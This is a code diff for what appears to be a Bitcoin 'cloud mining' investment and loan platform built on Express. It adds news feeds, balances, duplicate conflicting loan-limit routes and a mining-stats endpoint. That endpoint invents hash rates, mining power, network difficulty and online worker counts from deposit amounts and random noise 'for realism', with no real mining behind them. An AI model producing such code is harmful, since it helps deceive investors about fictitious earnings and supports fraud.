+async function fetchCryptoCompare() {
+  try {
+    const response = await axios.get(`${NEWS_API_CONFIG.cryptocompare.url}?categories=BTC&excludeCategories=Sponsored`);
+    return response.data.Data.map(item => ({
+      id: `cc-${item.id}`,
+      title: item.title,
+      description: item.body,
+      source: item.source_info.name,
+      url: item.url,
+      image: item.imageurl || 'https://www.cryptocompare.com/media/20562/favicon.png',
+      publishedAt: new Date(item.published_on * 1000).toISOString()
+    }));
+  } catch (error) {
+    console.error('CryptoCompare API error:', error.message);
+    return [];
+  }
+}
+
+// BTC News endpoint
+app.get('/api/btc-news', async (req, res) => {
+  try {
+    // Check cache first
+    const now = Date.now();
+    if (newsCache.data && now - newsCache.timestamp < NEWS_CACHE_TTL) {
+      return res.status(200).json({
+        status: 'success',
+        data: newsCache.data
+      });
+    }
+
+    // Fetch from all sources in parallel
+    const [cryptoPanicNews, newsDataNews, gNews, cryptoCompareNews] = await Promise.all([
+      fetchCryptoPanic(),
+      fetchNewsData(),
+      fetchGNews(),
+      fetchCryptoCompare()
+    ]);
+
+    // Combine and sort news by date
+    const allNews = [...cryptoPanicNews, ...newsDataNews, ...gNews, ...cryptoCompareNews]
+      .filter(item => item.title && item.url) // Filter out invalid items
+      .sort((a, b) => new Date(b.publishedAt) - new Date(a.publishedAt));
+
+    // Update cache
+    newsCache = {
+      data: allNews,
+      timestamp: now
+    };
+
+    res.status(200).json({
+      status: 'success',
+      data: allNews
+    });
+  } catch (error) {
+    console.error('BTC News error:', error);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to fetch BTC news'
+    });
+  }
+});
+
+app.get('/api/loans/limit', protect, async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id);
+    
+    // Calculate total transactions
+    const transactions = await Transaction.aggregate([
+      { $match: { user: user._id, status: 'completed' } },
+      { $group: { _id: null, total: { $sum: '$amount' } } }
+    ]);
+    
+    const totalTransactions = transactions[0]?.total || 0;
+    const MINIMUM_TRANSACTION = 5000;
+    const meetsMinimumRequirement = totalTransactions >= MINIMUM_TRANSACTION;
+    const kycVerified = user.kycStatus.identity === 'verified' && 
+                       user.kycStatus.address === 'verified' &&
+                       user.kycStatus.facial === 'verified';
+    
+    // Calculate loan limit (50% of total transactions, max $50k)
+    const limit = meetsMinimumRequirement && kycVerified 
+      ? Math.min(totalTransactions * 0.5, 50000)
+      : 0;
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        limit,
+        totalTransactions,
+        qualified: meetsMinimumRequirement && kycVerified,
+        meetsMinimumRequirement,
+        kycVerified
+      }
+    });
+
+  } catch (err) {
+    console.error('Get loan limit error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to calculate loan limit'
+    });
+  }
+});
+
+
+// Loan Qualification and Limit Calculation Endpoint
+app.get('/api/loans/limit', protect, async (req, res) => {
+    try {
+        // Check for outstanding loan balance first
+        const outstandingLoan = await Loan.findOne({
+            user: req.user.id,
+            status: { $in: ['active', 'pending', 'defaulted'] }
+        });
+
+        if (outstandingLoan) {
+            return res.status(400).json({
+                status: 'fail',
+                message: 'You have an outstanding loan balance. Please repay your existing loan before applying for a new one.'
+            });
+        }
+
+        // Calculate total transaction volume (completed deposits + withdrawals)
+        const [depositsResult, withdrawalsResult] = await Promise.all([
+            Transaction.aggregate([
+                {
+                    $match: {
+                        user: req.user._id,
+                        type: 'deposit',
+                        status: 'completed'
+                    }
+                },
+                {
+                    $group: {
+                        _id: null,
+                        total: { $sum: '$amount' }
+                    }
+                }
+            ]),
+            Transaction.aggregate([
+                {
+                    $match: {
+                        user: req.user._id,
+                        type: 'withdrawal',
+                        status: 'completed'
+                    }
+                },
+                {
+                    $group: {
+                        _id: null,
+                        total: { $sum: '$amount' }
+                    }
+                }
+            ])
+        ]);
+
+        const totalDeposits = depositsResult[0]?.total || 0;
+        const totalWithdrawals = withdrawalsResult[0]?.total || 0;
+        const totalTransactions = totalDeposits + totalWithdrawals;
+
+        // Check if user meets minimum transaction requirement ($5000)
+        const meetsMinimum = totalTransactions >= 5000;
+
+        // Calculate loan limit (20% of total transaction volume, capped at $50,000)
+        let loanLimit = Math.min(totalTransactions * 0.2, 50000);
+        loanLimit = Math.floor(loanLimit / 100) * 100; // Round down to nearest $100
+
+        // Check KYC status
+        const user = await User.findById(req.user.id);
+        const fullKycVerified = user.kycStatus.identity === 'verified' && 
+                               user.kycStatus.address === 'verified' &&
+                               user.kycStatus.facial === 'verified';
+
+        // Return loan qualification data
+        res.status(200).json({
+            status: 'success',
+            data: {
+                qualified: meetsMinimum && fullKycVerified,
+                limit: loanLimit,
+                totalTransactions: totalTransactions,
+                meetsMinimumRequirement: meetsMinimum,
+                kycVerified: fullKycVerified,
+                reasons: !meetsMinimum ? ['Minimum transaction requirement not met ($5,000 needed)'] : 
+                          !fullKycVerified ? ['Full KYC verification required'] : []
+            }
+        });
+
+        await logActivity('check-loan-eligibility', 'loan', null, req.user._id, 'User', req);
+    } catch (err) {
+        console.error('Loan qualification error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'An error occurred while checking loan eligibility'
+        });
+    }
+});
+
+
+
+
+
+
+
+// Get user balances
+app.get('/api/users/balances', protect, async (req, res) => {
+  try {
+    // Get current BTC price (using default if API fails)
+    let btcPrice = 50000; // Default value
+    try {
+      const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+      btcPrice = response.data.bitcoin.usd;
+    } catch (err) {
+      console.error('Failed to fetch BTC price:', err);
+    }
+
+    // Find user and ensure balances exist
+    const user = await User.findById(req.user.id);
+    if (!user) {
+      return res.status(404).json({
+        status: 'fail',
+        message: 'User not found'
+      });
+    }
+
+    // Initialize balances if they don't exist
+    if (!user.balances) {
+      user.balances = {
+        main: 0,
+        active: 0,
+        matured: 0,
+        savings: 0,
+        loan: 0
+      };
+      await user.save();
+    }
+
+    // Prepare response
+    const responseData = {
+      balances: {
+        main: user.balances.main,
+        active: user.balances.active,
+        matured: user.balances.matured,
+        savings: user.balances.savings,
+        loan: user.balances.loan
+      },
+      btcPrice,
+      btcValues: {
+        main: user.balances.main / btcPrice,
+        active: user.balances.active / btcPrice,
+        matured: user.balances.matured / btcPrice,
+        savings: user.balances.savings / btcPrice,
+        loan: user.balances.loan / btcPrice
+      }
+    };
+
+    res.status(200).json({
+      status: 'success',
+      data: responseData
+    });
+
+  } catch (err) {
+    console.error('Error fetching user balances:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to fetch user balances'
+    });
+  }
+});
+
+
+
+app.get('/api/mining', protect, async (req, res) => {
+  try {
+    const userId = req.user.id;
+    const cacheKey = `mining-stats:${userId}`;
+    
+    // Try to get cached data first (shorter cache time for real-time feel)
+    const cachedData = await redis.get(cacheKey);
+    if (cachedData) {
+      const parsedData = JSON.parse(cachedData);
+      // Add small random fluctuations to cached values for realism
+      parsedData.hashRate = fluctuateValue(parsedData.hashRate, 5); // ±5% fluctuation
+      parsedData.miningPower = fluctuateValue(parsedData.miningPower, 3); // ±3% fluctuation
+      parsedData.btcMined = fluctuateValue(parsedData.btcMined, 1); // ±1% fluctuation
+      return res.status(200).json({
+        status: 'success',
+        data: parsedData
+      });
+    }
+
+    // Get user's active investments
+    const activeInvestments = await Investment.find({
+      user: userId,
+      status: 'active'
+    }).populate('plan');
+
+    // Default response if no active investments
+    if (activeInvestments.length === 0) {
+      const defaultData = {
+        hashRate: "0 TH/s",
+        btcMined: "0 BTC",
+        miningPower: "0%",
+        totalReturn: "$0.00",
+        progress: 0,
+        lastUpdated: new Date().toISOString()
+      };
+      
+      await redis.set(cacheKey, JSON.stringify(defaultData), 'EX', 60); // Cache for 1 minute
+      return res.status(200).json({
+        status: 'success',
+        data: defaultData
+      });
+    }
+
+    // Calculate base values
+    let totalReturn = 0;
+    let totalInvestmentAmount = 0;
+    let maxProgress = 0;
+
+    for (const investment of activeInvestments) {
+      const investmentReturn = investment.expectedReturn - investment.amount;
+      totalReturn += investmentReturn;
+      totalInvestmentAmount += investment.amount;
+
+      // Calculate progress for this investment
+      const totalDuration = investment.endDate - investment.createdAt;
+      const elapsed = Date.now() - investment.createdAt;
+      const progress = Math.min(100, Math.max(0, (elapsed / totalDuration) * 100));
+      maxProgress = Math.max(maxProgress, progress);
+    }
+
+    // Get BTC price from CoinGecko
+    let btcPrice = 60000;
+    try {
+      const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+      btcPrice = response.data.bitcoin.usd;
+    } catch (error) {
+      console.error('CoinGecko API error:', error);
+    }
+
+    // Base calculations
+    const baseHashRate = totalInvestmentAmount * 0.1;
+    const baseMiningPower = Math.min(100, (totalInvestmentAmount / 10000) * 100);
+    const baseBtcMined = totalReturn / btcPrice;
+
+    // Apply realistic fluctuations
+    const currentTime = Date.now();
+    const timeFactor = Math.sin(currentTime / 60000); // Fluctuates every minute
+    
+    // Hash rate fluctuates more dramatically
+    const hashRateFluctuation = 0.05 * timeFactor + (Math.random() * 0.1 - 0.05);
+    const hashRate = baseHashRate * (1 + hashRateFluctuation);
+    
+    // Mining power has smaller fluctuations
+    const miningPowerFluctuation = 0.02 * timeFactor + (Math.random() * 0.04 - 0.02);
+    const miningPower = baseMiningPower * (1 + miningPowerFluctuation);
+    
+    // BTC mined has very small incremental changes
+    const btcMined = baseBtcMined * (1 + (Math.random() * 0.01 - 0.005));
+
+    // Simulate network difficulty changes
+    const networkFactor = 1 + (Math.sin(currentTime / 300000) * 0.1); // Changes every 5 minutes
+    const adjustedHashRate = hashRate / networkFactor;
+    const adjustedMiningPower = miningPower / networkFactor;
+
+    const miningData = {
+      hashRate: `${adjustedHashRate.toFixed(2)} TH/s`,
+      btcMined: `${btcMined.toFixed(8)} BTC`,
+      miningPower: `${Math.min(100, adjustedMiningPower).toFixed(2)}%`,
+      totalReturn: `$${totalReturn.toFixed(2)}`,
+      progress: parseFloat(maxProgress.toFixed(2)),
+      lastUpdated: new Date().toISOString(),
+      networkDifficulty: networkFactor.toFixed(2),
+      workersOnline: Math.floor(3 + Math.random() * 3) // Random workers between 3-5
+    };
+    
+    // Cache for 1 minute (shorter cache for more real-time feel)
+    await redis.set(cacheKey, JSON.stringify(miningData), 'EX', 60);
+    
+    res.status(200).json({
+      status: 'success',
+      data: miningData
+    });
+
+  } catch (error) {
+    console.error('Mining endpoint error:', error);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to fetch mining data'
+    });
+  }
+});
+
+// Helper function to add fluctuations to cached values
+function fluctuateValue(valueStr, percent) {
+  const numericValue = parseFloat(valueStr);
+  const fluctuation = (Math.random() * percent * 2 - percent) / 100; // ±percent%
+  const newValue = numericValue * (1 + fluctuation);
+  
+  // Preserve units if they exist
+  if (valueStr.endsWith(' TH/s')) {
+    return `${newValue.toFixed(2)} TH/s`;
+  }
+  if (valueStr.endsWith(' BTC')) {
+    return `${newValue.toFixed(8)} BTC`;
+  }
+  if (valueStr.endsWith('%')) {
+    return `${Math.min(100, newValue).toFixed(2)}%`;
+  }
+  return valueStr; // Return original if no known unit
+}
+
+
+
+
+
+
+
+
+
+
+
+// Get BTC deposit address (matches frontend structure exactly)
 app.get('/api/deposits/btc-address', protect, async (req, res) => {
     try {
         // Default BTC address from your frontend
@@ -7696,6 +8867,12 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
+
+
+
+
+
+
 // Admin Activity Endpoint - FIXED VERSION
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
   try {
@@ -8851,9 +10028,3 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
-
-
-
-
-
